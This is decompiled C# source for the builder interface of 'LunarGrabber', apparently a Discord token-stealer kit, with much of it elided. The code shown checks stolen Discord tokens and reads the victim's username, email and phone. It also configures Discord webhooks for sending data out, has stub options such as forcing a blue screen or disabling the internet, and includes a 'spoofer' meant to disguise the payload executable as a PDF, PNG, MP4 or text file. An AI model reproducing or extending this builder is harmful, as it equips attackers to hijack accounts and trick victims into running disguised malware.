...
namespace LunarGrabber
{
	public class MainForm : MetroForm
	{
		...
		private MetroTextBox spoofpath;
		...
		public static string CreatePaste(string content)
		{
			...
			return $"https://asteroid.loca.lt/{arg}";
		}
		...
		private string Options(string code)
		{
			...
			code = code.Replace("falseInternet", ((CheckBox)(object)internetCheckBox1).Checked.ToString());
			code = code.Replace("generatedBy", authusername);
			code = code.Replace("stubVersion", "1.7");
		...
		private void loginButton_Click(object sender, EventArgs e)
		{
			...
			{
				new DiscordForm(((Control)(object)loginTokenTextBox).Text).Show();
			}
			else
			{
		...
		private void loginTokenTextBox_TextChanged(object sender, EventArgs e)
		{
			if (ValidToken(((Control)(object)loginTokenTextBox).Text))
			{
				string text = ((Control)(object)loginTokenTextBox).Text;
				DiscordConfig val = new DiscordConfig();
				val.set_RetryOnRateLimit(true);
				DiscordClient val2 = new DiscordClient(text, val);
				((Control)(object)usernameLabel).Text = $"User: {((DiscordUser)val2.get_User()).get_Username()}#{((DiscordUser)val2.get_User()).get_Discriminator()}";
				((Control)(object)emailLabel).Text = string.Format("Email: {0}", val2.get_User().get_Email() ?? "Not found");
				((Control)(object)phoneLabel).Text = string.Format("Phone: {0}", val2.get_User().get_PhoneNumber() ?? "Not found");
			}
			else
			{
		...
		private bool ValidToken(string token)
		{
			try
			{
				DiscordConfig val = new DiscordConfig();
				val.set_RetryOnRateLimit(true);
				DiscordClient val2 = new DiscordClient(token, val);
				return true;
			}
			catch
			{
		...
		{
			MessageBox.Show("Our spoofer is under development!", "Asteroid LLC");
			if (((Control)(object)spoofpath).Text != null)
			{
				if (!((CheckBox)(object)mp4).Checked && !((CheckBox)(object)pdf).Checked && !((CheckBox)(object)png).Checked && !((CheckBox)(object)py).Checked)
				{
					_ = ((CheckBox)(object)txt).Checked;
				}
			}
			else
			{
				MessageBox.Show("A path is required to spoof the application!", "Asteroid LLC");
			}
		}
		...
		private void metroButton5_Click(object sender, EventArgs e)
		{
			...
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				((Control)(object)spoofpath).Text = openFileDialog.FileName;
			}
		}
		...
		private void InitializeComponent()
		{
			...
			internetCheckBox1 = new MetroCheckBox();
			...
			txt = new MetroCheckBox();
			py = new MetroCheckBox();
			png = new MetroCheckBox();
			pdf = new MetroCheckBox();
			mp4 = new MetroCheckBox();
			metroTabControl1 = new MetroTabControl();
			groupBox2 = new GroupBox();
			metroButton5 = new MetroButton();
			spoofpath = new MetroTextBox();
			...
			((Control)(object)metroTabPage2).SuspendLayout();
			...
			((Control)(object)mainTabControl).Controls.Add((Control)(object)metroTabPage2);
			...
			((TabControl)(object)mainTabControl).SelectedIndex = 3;
			...
			((TabControl)(object)metroTabControl2).SelectedIndex = 4;
			...
			((Control)(object)optionsTab).Controls.Add((Control)(object)internetCheckBox1);
			...
			((Control)(object)internetCheckBox1).AutoSize = true;
			((Control)(object)internetCheckBox1).Location = new Point(699, 145);
			((Control)(object)internetCheckBox1).Name = "internetCheckBox1";
			((Control)(object)internetCheckBox1).Size = new Size(105, 15);
			((Control)(object)internetCheckBox1).TabIndex = 50;
			((Control)(object)internetCheckBox1).Text = "Disable Internet";
			internetCheckBox1.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)internetCheckBox1, "Disable the Internet");
			internetCheckBox1.set_UseSelectable(true);
			((Control)(object)wifiCheckBox1).AutoSize = true;
			((Control)(object)wifiCheckBox1).Location = new Point(58, 145);
			((Control)(object)wifiCheckBox1).Name = "wifiCheckBox1";
			((Control)(object)wifiCheckBox1).Size = new Size(95, 15);
			((Control)(object)wifiCheckBox1).TabIndex = 49;
			...
			((Control)(object)bsodCheckBox).Location = new Point(699, 82);
			((Control)(object)bsodCheckBox).Name = "bsodCheckBox";
			((Control)(object)bsodCheckBox).Size = new Size(51, 15);
			((Control)(object)bsodCheckBox).TabIndex = 42;
			...
			((TabPage)(object)extraTab).Location = new Point(4, 38);
			((Control)(object)extraTab).Name = "extraTab";
			((Control)(object)extraTab).Size = new Size(845, 234);
			...
			((TabPage)(object)compilerTab).Location = new Point(4, 38);
			((Control)(object)compilerTab).Name = "compilerTab";
			((Control)(object)compilerTab).Size = new Size(845, 234);
			...
			((Control)(object)emailCheckBox1).TabIndex = 43;
			...
			((Control)(object)webhookIDbox).Location = new Point(464, 26);
			...
			((Control)(object)webhookIDbox).TabIndex = 42;
			webhookIDbox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)webhookIDbox, "The ID part of the Webhook");
			...
			((Control)(object)testWebhookButton).Click += testWebhookButton_Click_1;
			...
			((Control)(object)webhookTextBox).Location = new Point(21, 26);
			...
			((Control)(object)webhookTextBox).TabIndex = 40;
			webhookTextBox.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)webhookTextBox, "The text part of the Webhook");
			...
			((TabPage)(object)otherTab).Location = new Point(4, 38);
			((Control)(object)otherTab).Name = "otherTab";
			((Control)(object)otherTab).Size = new Size(907, 399);
			...
			((TabPage)(object)settingsTab).Location = new Point(4, 38);
			((Control)(object)settingsTab).Name = "settingsTab";
			((Control)(object)settingsTab).Size = new Size(907, 399);
			...
			((Panel)(object)metroTabPage2).BorderStyle = BorderStyle.FixedSingle;
			((Control)(object)metroTabPage2).Controls.Add(groupBox3);
			((Control)(object)metroTabPage2).Controls.Add((Control)(object)metroTabControl1);
			((Control)(object)metroTabPage2).Controls.Add(groupBox2);
			metroTabPage2.set_HorizontalScrollbarBarColor(true);
			metroTabPage2.set_HorizontalScrollbarHighlightOnWheel(false);
			metroTabPage2.set_HorizontalScrollbarSize(10);
			((TabPage)(object)metroTabPage2).Location = new Point(4, 38);
			((Control)(object)metroTabPage2).Name = "metroTabPage2";
			((Control)(object)metroTabPage2).Size = new Size(907, 399);
			((TabPage)(object)metroTabPage2).TabIndex = 6;
			((Control)(object)metroTabPage2).Text = "Spoofer";
			metroTabPage2.set_Theme((MetroThemeStyle)2);
			metroTabPage2.set_VerticalScrollbarBarColor(true);
			metroTabPage2.set_VerticalScrollbarHighlightOnWheel(false);
			metroTabPage2.set_VerticalScrollbarSize(10);
			((Control)(object)txt).AutoSize = true;
			((Control)(object)txt).Location = new Point(21, 104);
			((Control)(object)txt).Name = "txt";
			((Control)(object)txt).Size = new Size(42, 15);
			((Control)(object)txt).TabIndex = 54;
			((Control)(object)txt).Text = "TXT";
			txt.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)txt, "TEXT");
			txt.set_UseSelectable(true);
			((Control)(object)py).AutoSize = true;
			((Control)(object)py).Location = new Point(21, 83);
			((Control)(object)py).Name = "py";
			((Control)(object)py).Size = new Size(37, 15);
			((Control)(object)py).TabIndex = 53;
			((Control)(object)py).Text = "PY";
			py.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)py, "PYTHON");
			py.set_UseSelectable(true);
			((Control)(object)png).AutoSize = true;
			((Control)(object)png).Location = new Point(21, 62);
			((Control)(object)png).Name = "png";
			((Control)(object)png).Size = new Size(47, 15);
			((Control)(object)png).TabIndex = 52;
			((Control)(object)png).Text = "PNG";
			png.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)png, "PNG");
			png.set_UseSelectable(true);
			((Control)(object)pdf).AutoSize = true;
			((Control)(object)pdf).Location = new Point(21, 41);
			((Control)(object)pdf).Name = "pdf";
			((Control)(object)pdf).Size = new Size(44, 15);
			((Control)(object)pdf).TabIndex = 51;
			((Control)(object)pdf).Text = "PDF";
			pdf.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)pdf, "PDF");
			pdf.set_UseSelectable(true);
			((Control)(object)mp4).AutoSize = true;
			((Control)(object)mp4).Location = new Point(21, 20);
			((Control)(object)mp4).Name = "mp4";
			((Control)(object)mp4).Size = new Size(47, 15);
			((Control)(object)mp4).TabIndex = 50;
			((Control)(object)mp4).Text = "MP4";
			mp4.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)mp4, "MP4");
			mp4.set_UseSelectable(true);
			((Control)(object)metroTabControl1).Location = new Point(858, 353);
			((Control)(object)metroTabControl1).Name = "metroTabControl1";
			((Control)(object)metroTabControl1).Size = new Size(17, 22);
			((TabControl)(object)metroTabControl1).SizeMode = TabSizeMode.Fixed;
			((Control)(object)metroTabControl1).TabIndex = 18;
			metroTabControl1.set_Theme((MetroThemeStyle)2);
			metroTabControl1.set_UseSelectable(true);
			groupBox2.BackColor = Color.Transparent;
			groupBox2.Controls.Add((Control)(object)metroButton5);
			groupBox2.Controls.Add((Control)(object)spoofpath);
			groupBox2.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			groupBox2.ForeColor = Color.White;
			groupBox2.Location = new Point(30, 19);
			groupBox2.Name = "groupBox2";
			groupBox2.Size = new Size(845, 74);
			groupBox2.TabIndex = 19;
			groupBox2.TabStop = false;
			groupBox2.Text = "Application";
			metroButton5.set_Highlight(true);
			((Control)(object)metroButton5).Location = new Point(693, 26);
			((Control)(object)metroButton5).Name = "metroButton5";
			((Control)(object)metroButton5).Size = new Size(130, 22);
			((Control)(object)metroButton5).TabIndex = 41;
			((Control)(object)metroButton5).Text = ".exe";
			metroButton5.set_Theme((MetroThemeStyle)2);
			metroButton5.set_UseSelectable(true);
			((Control)(object)metroButton5).Click += metroButton5_Click;
			spoofpath.get_CustomButton().set_Image((Image)null);
			((Control)(object)spoofpath.get_CustomButton()).Location = new Point(646, 2);
			((Control)(object)spoofpath.get_CustomButton()).Name = "";
			((Control)(object)spoofpath.get_CustomButton()).Size = new Size(17, 17);
			spoofpath.get_CustomButton().set_Style((MetroColorStyle)4);
			((Control)(object)spoofpath.get_CustomButton()).TabIndex = 1;
			spoofpath.get_CustomButton().set_Theme((MetroThemeStyle)1);
			spoofpath.get_CustomButton().set_UseSelectable(true);
			((Control)(object)spoofpath.get_CustomButton()).Visible = false;
			((Control)(object)spoofpath).ForeColor = Color.White;
			spoofpath.set_Lines(new string[0]);
			((Control)(object)spoofpath).Location = new Point(21, 26);
			spoofpath.set_MaxLength(32767);
			((Control)(object)spoofpath).Name = "spoofpath";
			spoofpath.set_PasswordChar('\0');
			spoofpath.set_PromptText("Spoofer");
			spoofpath.set_ScrollBars(ScrollBars.None);
			spoofpath.set_SelectedText("");
			spoofpath.set_SelectionLength(0);
			spoofpath.set_SelectionStart(0);
			spoofpath.set_ShortcutsEnabled(true);
			((Control)(object)spoofpath).Size = new Size(666, 22);
			((Control)(object)spoofpath).TabIndex = 40;
			spoofpath.set_Theme((MetroThemeStyle)2);
			metroToolTip.SetToolTip((Control)(object)spoofpath, "PATH for the Application to spoof");
			spoofpath.set_UseSelectable(true);
			spoofpath.set_WaterMark("Spoofer");
			spoofpath.set_WaterMarkColor(Color.FromArgb(109, 109, 109));
			spoofpath.set_WaterMarkFont(new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel));
			...
			groupBox3.Controls.Add((Control)(object)metroButton1);
			groupBox3.Controls.Add((Control)(object)mp4);
			groupBox3.Controls.Add((Control)(object)pdf);
			groupBox3.Controls.Add((Control)(object)txt);
			groupBox3.Controls.Add((Control)(object)png);
			groupBox3.Controls.Add((Control)(object)py);
			groupBox3.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			groupBox3.ForeColor = Color.White;
			groupBox3.Location = new Point(30, 99);
			groupBox3.Name = "groupBox3";
			groupBox3.Size = new Size(845, 133);
			groupBox3.TabIndex = 55;
			groupBox3.TabStop = false;
			groupBox3.Text = "Configuration";
			metroButton1.set_Highlight(true);
			((Control)(object)metroButton1).Location = new Point(693, 97);
			((Control)(object)metroButton1).Name = "metroButton1";
			((Control)(object)metroButton1).Size = new Size(130, 22);
			((Control)(object)metroButton1).TabIndex = 41;
			((Control)(object)metroButton1).Text = "Spoof";
			metroButton1.set_Theme((MetroThemeStyle)2);
			metroButton1.set_UseSelectable(true);
			((Control)(object)metroButton1).Click += metroButton1_Click;
			...
			((Control)(object)metroTabPage2).ResumeLayout(performLayout: false);
